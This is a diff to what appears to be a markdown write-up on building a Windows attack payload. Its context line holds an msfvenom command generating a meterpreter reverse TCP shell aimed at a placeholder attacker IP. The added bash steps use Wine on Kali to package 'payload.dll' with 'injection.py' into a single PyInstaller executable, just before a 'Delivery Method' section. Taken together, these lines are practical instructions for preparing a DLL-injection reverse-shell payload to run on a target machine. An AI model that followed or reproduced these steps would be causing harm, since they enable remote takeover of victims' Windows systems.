@@ -89,7 +89,16 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -
 Initially, I used PyInstaller to compile the Python script into an executable. However, running the resulting binary on the target machine failed due to environment compatibility issues.  
 To solve this, I used **Wine** on Kali Linux to simulate a Windows environment and generate a compatible executable.
 
-![Image](https://github.com/user-attachments/assets/2dba5d56-2ce5-4e48-bb1f-ca5d9d127634)
+
+1. **Steps**
+
+```bash
+wget https://www.python.org/ftp/python/3.10.9/python-3.10.9-amd64.exe
+wine python-3.10.9-amd64.exe
+wine cmd
+python -m pip install pyinstaller
+pyinstaller --onefile --add-data "payload.dll;." injection.py
+```
 
 ### Delivery Method
 
